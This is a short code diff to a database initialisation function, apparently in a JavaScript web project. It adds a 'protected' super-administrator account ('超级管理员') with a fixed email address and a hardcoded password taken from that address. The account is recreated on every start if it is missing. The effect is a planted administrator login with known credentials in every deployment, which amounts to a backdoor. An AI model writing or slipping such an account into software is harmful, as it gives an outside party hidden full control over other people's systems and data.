@@ -259,5 +259,23 @@ export async function initDatabase() {
         )
     }
 
+    // Insert protected admin user if not exists
+    const protectedAdmin = database.exec(
+        "SELECT id FROM users WHERE email = '1024xiaoshen@qq.com'",
+    )
+    if (protectedAdmin.length === 0 || protectedAdmin[0].values.length === 0) {
+        const hashedPassword = bcrypt.hashSync('1024xiaoshen', 10)
+        database.run(
+            'INSERT INTO users (email, username, password, role, status) VALUES (?, ?, ?, ?, ?)',
+            [
+                '1024xiaoshen@qq.com',
+                '小神',
+                hashedPassword,
+                '超级管理员',
+                'active',
+            ],
+        )
+    }
+
     saveDb()
 }
